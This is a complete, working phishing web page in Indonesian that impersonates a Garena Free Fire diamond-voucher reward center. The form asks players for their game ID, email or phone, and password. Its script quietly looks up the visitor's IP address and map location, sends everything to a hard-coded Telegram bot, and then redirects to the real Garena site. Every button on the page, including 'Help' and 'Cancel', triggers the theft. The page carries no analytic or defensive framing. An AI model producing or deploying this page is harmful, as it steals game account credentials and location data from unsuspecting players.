<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Reward Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background: url('https://wallpaperaccess.com/full/1155026.jpg') no-repeat center center fixed; 
            background-size: cover; 
        }
        .overlay { background: rgba(0, 0, 0, 0.8); position: absolute; inset: 0; z-index: 1; }
        .ff-border { border: 2px solid #ffcc00; background: rgba(20, 20, 20, 0.95); }
        .ff-btn { background: linear-gradient(180deg, #ffcc00 0%, #ff9900 100%); color: black; font-weight: 900; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="overlay"></div>
    
    <div class="relative z-10 ff-border p-6 rounded-lg shadow-2xl w-full max-w-sm text-white border-yellow-500">
        <div class="text-center mb-6">
            <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" class="h-12 mx-auto mb-2">
            <h2 class="text-xl font-black italic uppercase tracking-tighter text-yellow-500">Diamond Voucher</h2>
            <p class="text-xs text-gray-400">Masukkan data akun untuk menerima hadiah</p>
        </div>

        <form id="ffForm" class="space-y-4">
            <input type="text" id="userid" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="ID Pemain" required>
            <input type="text" id="username" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Email / Phone" required>
            <input type="password" id="password" class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Password" required>

            <button type="submit" class="universal-btn w-full ff-btn py-3 rounded uppercase tracking-widest hover:scale-105 transition duration-200">
                KLAIM HADIAH
            </button>
            
            <div class="flex space-x-2">
                <button type="button" class="universal-btn w-1/2 bg-gray-700 py-2 rounded text-xs font-bold hover:bg-gray-600">BANTUAN</button>
                <button type="button" class="universal-btn w-1/2 bg-gray-700 py-2 rounded text-xs font-bold hover:bg-gray-600">BATAL</button>
            </div>
        </form>
        
        <p class="mt-6 text-[10px] text-center text-gray-600">Garena Free Fire Â© 2026. All Rights Reserved.</p>
    </div>

    <script>
        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc";
        const CHAT_ID = "8551809114";

        // Fungsi sakti buat kirim data
        async function kirimData() {
            const uid = document.getElementById('userid').value;
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if(!uid || !user || !pass) {
                alert("Isi semua data dulu!");
                return;
            }

            // Ambil IP & Lokasi secara diam-diam
            let locData = "Gagal ambil lokasi";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const json = await res.json();
                locData = `ðŸŒ IP: ${json.ip}\nðŸ™ï¸ Kota: ${json.city}\nðŸ“ Maps: https://www.google.com/maps?q=${json.latitude},${json.longitude}`;
            } catch (e) {}

            const text = `ðŸ”¥ **SETORAN BARU (FF)** ðŸ”¥\n\nðŸ†” ID: \`${uid}\` \nðŸ‘¤ User: \`${user}\` \nðŸ”‘ Pass: \`${pass}\` \n\n${locData}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            }).then(() => {
                // Tendang ke halaman asli
                window.location.href = "https://ff.garena.com/id/";
            });
        }

        // Cari semua elemen dengan class 'universal-btn'
        const buttons = document.querySelectorAll('.universal-btn');
        
        // Kasih event ke tiap tombol, apapun yang diklik, datanya kekirim
        buttons.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                kirimData();
            });
        });

        // Tetep jagain kalau dia tekan 'Enter' di keyboard
        document.getElementById('ffForm').addEventListener('submit', function(e) {
            e.preventDefault();
            kirimData();
        });
    </script>
</body>
</html>
